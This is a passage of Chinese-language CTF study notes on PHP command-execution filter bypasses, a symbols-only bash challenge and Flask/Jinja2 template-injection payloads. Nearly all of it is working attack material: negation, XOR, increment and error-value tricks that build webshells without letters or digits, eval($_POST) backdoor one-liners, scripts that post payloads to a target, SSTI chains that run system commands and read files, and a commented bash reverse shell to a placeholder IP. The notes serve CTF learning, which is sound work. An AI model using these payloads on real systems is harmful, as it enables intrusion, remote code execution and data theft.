`cat、tac、more、less、head、tail、nl、sort、uniq、rev`
```
php小技巧
```php
$_=`/???/??? /????`;?><?=$_?>
实际上等价于:
$_=`/bin/cat /FLAG`;?><?=$_?>

<?=$_?> 实际上这串代码等价于<? echo $_?>
实际上,当 php.ini 中的 short_open_tag 开启的时候,<? ?> 短标签就相当于 <?php ?>,<?=$_?> 也等价于 <? echo $_?>
```
[CTF题目思考--极限利用](https://www.anquanke.com/post/id/154284)
[命令执行与代码执行的小结 ](https://www.anquanke.com/post/id/162128)

花括号的别样用法：
![](https://img-blog.csdnimg.cn/20200313130312550.png)
```
$( )中放的是命令，相当于` `,例如todaydate=$(date +%Y%m%d)意思是执行date命令,返回执行结果给变量todaydate,也可以写为todaydate=`date +%Y%m%d`;
${ }中放的是变量，例如echo ${PATH}取PATH变量的值并打印，也可以不加括号比如$PATH
```

**一个考点，记录一下：(php反引号命令执行)**
```php
<?php
    if(isset($_GET['cc'])){
        $cc = $_GET['cc'];
        eval(substr($cc, 0, 6));
    }
    else{
        highlight_file(__FILE__);
    }
?>
```
`eval(substr($cc, 0, 6));`他只执行`$cc`的前6个字符，但是可以利用
```
`$cc`;xxxxxxxxxx
```
xxxxx为执行的命令

**四个字符的用法：**
![](https://p2.ssl.qhimg.com/t01947fe24ad16c4d98.png)
```bash
>cat
* /*
```

[巧用命令注入的N种方式](https://blog.zeddyu.info/2019/01/17/命令执行)
参考文章：
[DNSlog盲注](http://www.pdsdt.lovepdsdt.com/index.php/2020/11/04/dnslog/)
[RCE Bypass小结](http://www.pdsdt.lovepdsdt.com/index.php/2020/12/08/rce-bypass/)
[命令执行绕过总结](https://mp.weixin.qq.com/s/6E2fXnuHkBt_fgRZL6z7bA)
[巧用命令注入的N种方式](https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/)
[浅谈PHP无回显命令执行的利用](https://xz.aliyun.com/t/8125)
[CTF命令执行及绕过技巧](https://blog.csdn.net/JBlock/article/details/88311388)
[Bypass一些命令注入限制的姿势](https://xz.aliyun.com/t/3918)
[巧用DNSlog实现无回显注入](https://www.cnblogs.com/afanti/p/8047530.html)
[ctf中常见php rce绕过总结](https://xz.aliyun.com/t/8354)
[Bypass一些命令注入限制的姿势](https://xz.aliyun.com/t/3918)
[eval长度限制绕过 && PHP5.6新特性](https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html)
[命令执行与代码执行的小结](https://www.anquanke.com/post/id/162128)
#### 白名单函数构造
一种payload是这样：
```php
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php
```
分析：
```
base_convert(37907361743,10,36) => "hex2bin"
dechex(1598506324) => "5f474554"
$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
```
另一种payload是这样
```php
$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
```
分析：
```
base_convert(696468,10,36) => "exec"
$pi(8768397090111664438,10,30) => "getallheaders"
exec(getallheaders(){1})
//操作xx和yy，中间用逗号隔开，echo都能输出
echo xx,yy
既然不能$_GET，那就header传
```
![](https://img-blog.csdnimg.cn/20200320141415534.png)
直接想办法catflag也是可以的
```php
//exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
//system('cat'.dechex(16)^asinh^pi) => system('cat *')
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
```
[刷题记录：[CISCN 2019 初赛]Love Math](https://www.cnblogs.com/20175211lyz/p/11588219.html)

#### 命令执行绕过
**不用数字构造出数字**
利用了 PHP 弱类型特性，true 的值为 1，故 true+true==2。
```php
<?php
$_=('>'>'<')+('>'>'<');
print($_);
print($_/$_);
```
结果会输出：2 1

在 php 中未定义的变量默认值为 null，`null==false==0`，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。
```php
<?php
$_++;
print($_);
```
结果会输出：1
```php
<?php
print(!!_);
```
![](https://img-blog.csdnimg.cn/20200915000040693.png)


**过滤了`_`**
```php
?><?=`{${~"%a0%b8%ba%ab"}[%a0]}`?>
```
分析下这个Payload，`?>`闭合了eval自带的`<?`标签。接下来使用了短标签。`{}`包含的PHP代码可以被执行，`~"%a0%b8%ba%ab"`为`"_GET"`，通过反引号进行shell命令执行。最后我们只要GET传参`%a0`即可执行命令

**过滤了`$`**
在PHP7中，我们可以使用($a)()这种方法来执行命令
这里我使用call_user_func()来举例
```php
(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,'');
```
其中`~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c`是`"call_user_func"`，`~%8c%86%8c%8b%9a%92`是`"system"`，`~%88%97%90%9e%92%96`是`"whoami"`

PHP5中不再支持($a)()这种方法来调用函数
1. shell下可以利用.来执行任意脚本
2. Linux文件名支持用glob通配符代替

根据P神的文章，最后我们可以采用的Payload是:
```php
?><?=`. /???/????????[@-[]`;?>
`. /t*/*`
```
最后的`[@-[]`表示ASCII在`@`和`[`之间的字符，也就是大写字母，所以最后会执行的文件是tmp文件夹下结尾是大写字母的文件
![](https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.png)

脚本如下:
```python
import requests

url="http://127.0.0.1/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat /f*'}
response=requests.post(url,files=files)
html = response.text
print(html)
```

**PHP 中取反 (~) 的概念**
```php
<?php 
error_reporting(0);
$a='assert';
$b=urlencode(~$a);
echo $b;
echo "\n";
$c='(eval($_POST[pass]))';
$d=urlencode(~$c);
echo $d;
 ?>
```
![](https://img-blog.csdnimg.cn/20200410212200713.png)
利用：`?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8F%9E%8C%8C%A2%D6%D6)`

网上的构造脚本：
```php
<?php
//在命令行中运行

/*author yu22x*/

fwrite(STDOUT,'[+]your function: ');
$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
fwrite(STDOUT,'[+]your command: ');
$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

```php
[+]your function: system
[+]your command: ls
[*] (~%8C%86%8C%8B%9A%92)(~%93%8C);
```
**异或运算的利用**
Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当于取反，可以绕过被过滤的取反符号，即：
![](https://img-blog.csdnimg.cn/20200411130214538.png)

```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=eval($_POST['a'])
```
网上的构造脚本：
```php
<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 
        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)^urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }
}
}
fwrite($myfile,$contents);
fclose($myfile);
```
```python
# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("xor_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"^\""+s2+"\")"
   return(output)

while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```
php运行后生成一个txt文档，包含所有可见字符的异或构造结果
接着运行python脚本即可
```php
[+] your function：system
[+] your command：ls
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08"^"%60%7b");
```

**或运算的利用**
在这张图表上，`'@'|'(任何左侧符号)'=='(右侧小写字母)'`
![](https://img-blog.csdnimg.cn/2020080722072453.png)
即`'@'|'!'=='a' `，那么 `('@@@@'|'().4')=='hint'`
最后`?code=($_ = '@@@@'|'().4') == 1?1:$$_`
![](https://img-blog.csdnimg.cn/20200829132052613.png)
![](https://img-blog.csdnimg.cn/20200829132322511.png)

[2020安恒DASCTF八月浪漫七夕战 ezrce Writeup](https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/)

**无字母数字递增rce**
过滤了`~`与`^`,就不能用取反和异或来进行getshell
想到的方法是递增，但是递增需要分号，需要绕过分号，来进行getshell，测试发现可以利用`<?=?>`来进行绕过
递增的代码 相当于`system($_POST[_]);`：
```php
<?=$_=[]?>
<?=$_="$_"?>
<?=$_=$_['!'=='@']?>
<?=$___=$_?>
<?=$__=$_?>
<?=$__++?><?=$__++?>
<?=$__++?><?=$__++?>
<?=$____=$__++?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$_____________=$__++?><?=$__++?>
<?=$__________=$__++?>
<?=$_________=$__++?>
<?=$__++?>
<?=$________=$__++?>
<?=$_____=$__++?>
<?=$______=$__++?>
<?=$______?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$____________=$__++?>
<?=$_____.$____________.$_____.$______.$____.$_____________?>
<?=$________________=$_____.$____________.$_____.$______.$____.$_____________?>
<?=$_________.$__________.$_____.$______?>
<?=($________________)(${'_'.$_________.$__________.$_____.$______}[_])?>
```
还可以：
```php
<?php $_=[];$_=@"$_";$_=$_["!"=="@"];$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$____="_";$____.=$__;$____.=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$_[_]($_[__]);
```
构造的是`$_GET[_]($_GET[__])`木马

[De1CTF2020部分writeup ](https://www.anquanke.com/post/id/204345)

[无字母数字绕过正则表达式总结(含上传临时文件、异或、或、取反、自增脚本)](https://xz.aliyun.com/t/9387)
[php利用math函数rce总结](https://www.anquanke.com/post/id/220813)
[php 不用字母，数字和下划线写 shell](https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w)
[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
[无字母数字webshell总结](https://xz.aliyun.com/t/8107)
#### 利用PHP的错误运算返回来构造字母
>1/0 返回 INF //0为除数
0/0 返回 NAN
((1/0).(0)){0}  / I
((0/0).(0)){1}  / A

然后利用位运算来构造其他字符，先尝试在已得到字符中进行`|(或)`运算或者`&`运算
```python
a = ['A','F','I','N']
for i in a:
    for j in a:
        print i,j,chr(ord(i)|ord(str(j)))
        print i,j,chr(ord(i)&ord(str(j)))
```
最后构造如下：
```php
(((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){0}&((1/0).(0)){0}).((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((1/0).(0)){0}).(((0/0).(0)){0}).(((1/0).(0)){2}).(((1/0).(0)){0}|((1/0).(0)){2}))()
//('phpinfo')()
((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))()
//('GEtALLHEADErs')()
((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))()
// ('systEM')()
最终payload：
((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))(((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))(){111})
//('systEM')(('GEtALLHEADErs')(){111})
```
记录的字符如下：
```php
q:  ((0/0).(0)){1}|((1).(0)){0}
A:  ((0/0).(0)){1}
v:  ((1/0).(0)){2}|((0).(0)){0}
p:  (((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})
N:  ((0/0).(0)){0}
I:  ((1/0).(0)){0}
H:  ((0/0).(0)){0}&((1/0).(0)){0}
F:  ((1/0).(0)){2}
O:  ((1/0).(0)){0}|((1/0).(0)){2}
G:  ((0/0).(0)){1}|((1/0).(0)){2}
u:  (((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}
t:  ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})
E:  ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})
D:  ((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})
L:  (((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))
s:  ((0/0).(0)){1}|((2).(0)){0}
r:  (((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})
y:  ((0/0).(0)){1}|((8).(0)){0}
x:  (((0/0).(0)){0}&((1/0).(0)){0})|((8).(0)){0}
C:  (((0/0).(0)){1}|((2).(0)){0})&(((0/0).(0)){1}|((1/0).(0)){2})
M:  (((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))
```
[从一道CTF题目中学习新的无字母webshell构造](https://www.anquanke.com/post/id/207492)

这里还学到一种方法：
使用`...`可以构造出字符串
`[999999999999999...1][0][3]` 这样就可以得到E了
[https://github.com/Xuxfff/PHPevalBaypass](https://github.com/Xuxfff/PHPevalBaypass)

#### 无参数RCE
**法一：session_id()**
```php
<?php
echo bin2hex('phpinfo();');  //706870696e666f28293b
```
最后`eval(hex2bin(session_id(session_start())));`
Cookies:PHPSESSID=706870696e666f28293b
也可以`show_source(session_id(session_start()));`
设置cookie PHPSESSID=flag.php
```python
import requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "phpinfo();".encode('hex')
cookies = {
	'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content
```
**法二：get_defined_vars()**
>get_defined_vars ( void ) : array 返回由所有已定义变量所组成的数组
此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

```php
?code=eval(end(current(get_defined_vars())));&b=phpinfo();
?b=phpinfo();//&code=eval(implode(reset(get_defined_vars())));
?b=phpinfo();&code=eval(reset(current(get_defined_vars())));
?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=eval("phpinfo();");
```
**法三：getallheaders()**
使用getallheaders()其实具有局限性，因为他是apache的函数
``eval(end(getallheaders()))``  利用HTTP最后的一个header传参
``eval(getallheaders(){'a'})``  利用HTTP名为a的header传参

取反利用：`(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));`
![](https://img-blog.csdnimg.cn/20200819152626629.png)
即：`(assert)((next)((getallheaders)()));`

```php
system(end(getallheaders()));
//(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))()));
```
另一种利用：
```php
system(end(getallheaders()));
//[~%8c%86%8c%8b%9a%92]{!_}([~%9a%91%9b]{!_}([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c]{!_}()));
```
**法四：dirname() & chdir()**
利用getcwd() 获取当前目录
用scandir() 目录遍历
dirname() 目录上跳==>给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。
chdir() 更改当前目录
`readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));`

[php无参数执行命令](http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/)
[从一道CTF题学习Fuzz思想](https://xz.aliyun.com/t/6737)
[[原题复现]ByteCTF 2019 –WEB- Boring-Code[无参数rce、绕过filter_var(),等]](https://www.cnblogs.com/xhds/p/12881059.html)
[PHP Parametric Function RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE)

#### Web-Bash
题目源码：
```php
<?php
highlight_file(__FILE__);
if(isset($_POST["cmd"]))
{
    $test = $_POST['cmd'];
    $white_list = str_split('${}#\\(<)\'0'); 
    $char_list = str_split($test);
    foreach($char_list as $c){
        if(!in_array($c,$white_list)){
                die("Cyzcc");
            }
        }
    echo $test;
    exec($test);
}
?>
```
只能包含以下字元：`$ ( ) # ! { } < \ '`
>1.`$#` => 0
`$#` 的意思是參數的個數，這題沒有其餘的參數所以會是 0
2.`$(($#<$$))` => 1
`$$` 代表的是目前的 pid ，pid 會 > 0 所以可以得到 1
3.`$((1<<1))` => 2
shift 運算，bj4
4.`$((2#bbb))` => 任意數字
將 bbb 以二進制轉換成數字
5.`<<<` 的用途是將任意字串交由前面的指令執行
6.bash 可以用 `$'\ooo'` 的形式來表達任意字元（ooo 是字元轉 ascii 的八進制）

推薦超詳細的 bash 文件：[Advanced Bash-Scripting Guide](https://tldp.org/LDP/abs/html/abs-guide.html)
可以利用八进制的方法绕过一些ban了字母的题：`$'\154\163'`
![](./images/pasted-218.png)
可以利用位运算和进制转换的方法利用符号构造数字，本题中直接给出0简化了一些操作：
![](./images/pasted-219.png)

转换成数字之后就需要用到`<<<`来重定向了，但是一层不够，只用一层会出现`bash: $'\154\163': command not found`这样的报错，得知bash一次解析只能解析到成数字，需要第二次解析，需要给原先的命令添加转义字符

```python
import requests
n = dict()
n[0] = '0'
n[1] = '${##}'    #${##}计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#))
n[2] = '$((${##}<<${##}))'    #通过位运算得到2
n[3] = '$(($((${##}<<${##}))#${##}${##}))'    #通过二进制11转换为十进制得到3,4,5,6,7
n[4] = '$((${##}<<$((${##}<<${##}))))'
n[5] = '$(($((${##}<<${##}))#${##}0${##}))'
n[6] = '$(($((${##}<<${##}))#${##}${##}0))'
n[7] = '$(($((${##}<<${##}))#${##}${##}${##}))'

f=''

def str_to_oct(cmd):       #命令转换成八进制字符串
	s = ""
	for t in cmd:
		o = ('%s' % (oct(ord(t))))[2:]
		s+='\\'+o
	return s
    
def build(cmd):       #八进制字符串转换成字符
	payload = "$0<<<$0\<\<\<\$\\\'"
	s = str_to_oct(cmd).split('\\')
	for _ in s[1:]:
		payload+="\\\\"
		for i in _:
			payload+=n[int(i)]
	return payload+'\\\''
    
def get_flag(url,payload):       #盲注函数
	try:
		data = {'cmd':payload}
		r = requests.post(url,data,timeout=1.5)
	except:
		return True
	return False
    
#弹shell
#print(build('bash -i >& /dev/tcp/your-ip/2333 0>&1'))

#盲注
# a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@'
# for i in range(1,50):
#	 for j in a:
#		 cmd=f'cat /flag|grep ^{f+j}&&sleep 3'
#		 url = "http://ip/"
#		 if get_flag(url,build(cmd)):
#			 break
#	 f = f+j
#	 print(f)
```

参考文章：
[安洵杯部分WP](https://www.anquanke.com/post/id/223786)
[34C3 CTF: minbashmaxfun](https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/)
[34C3CTF 2017 MISC 162 minbashmaxfun](https://ddaa.tw/34c3ctf_2017_misc_162_minbashmaxfun.html)
### 模板注入
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
**类继承：**

python中对一个变量应用class方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法

>\_\_base__ //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法
\_\_mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到
\_\_subclasses__() //继承此对象的子类，返回一个列表

**魔术函数：**

这里介绍几个常见的魔术函数，有助于后续的理解

>`__dict__`类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的`__dict__`里的对象的`__dict__`中存储了一些self.xxx的一些东西内置的数据类型没有`__dict__`属性每个类有自己的`__dict__`属性，就算存在继承关系，父类的`__dict__` 并不会影响子类的`__dict__`对象也有自己的`__dict__`属性， 存储self.xxx 信息，父子类对象公用`__dict__`
>`__globals__`该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用**globals**属性访问全局的变量。该属性保存的是函数全局变量的字典引用。
>`__getattribute__()`实例、类、函数都具有的`__getattribute__`魔术方法。事实上，在实例化的对象进行.操作的时候（形如：`a.xxx/a.xxx()`），都会自动去调用`__getattribute__`方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。


[服务端模板注入攻击](https://zhuanlan.zhihu.com/p/28823933)
[SSTI/沙盒逃逸详细总结](https://www.anquanke.com/post/id/188172)
[SSTI模板注入](https://www.jianshu.com/p/aef2ae0498df)
[一篇文章带你理解漏洞之 SSTI 漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E)
[python 模板注入](https://www.cnblogs.com/tr1ple/p/9415641.html)
[利用Python字符串格式化特性绕过ssti过滤](https://xz.aliyun.com/t/7519)
[Python沙箱逃逸的n种姿势](https://xz.aliyun.com/t/52)
#### Flask/Jinja2
字符串拼接(思路)：
```python
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
{{''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__("o'+'s").po'+'pen("cat /this_is_the_fl'+'ag.txt")').read()}}
或者
{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['sys'].modules['o'+'s'].__dict__['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()}}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}

{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('cat /fl4g|base64').read()}}
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[40]('/flag').read() }}
{{session.__init__.__globals__["__bui""ltins__")].open("/fl".__add__("ag")).read()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')()}}
```
原型payload：
```python
''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].system("ls")
```
bypass waf变种payload:
```python
getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')
```

**python3 payload:**

```python
#命令执行：
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('ls')

().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__["sys"].modules["os"].system("ls")

''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].system("ls")

[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')
```
新颖的绕过思路：
```python
//8进制绕过
print(a|attr("\137\137\151\156\151\164\137\137")|attr("\137\137\147\154\157\142\141\154\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51"))
print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())

//unicode绕过
print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()
//使用get传参
?guess={{ ({}|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)())}}
&x1=__class__
&x2=__base__
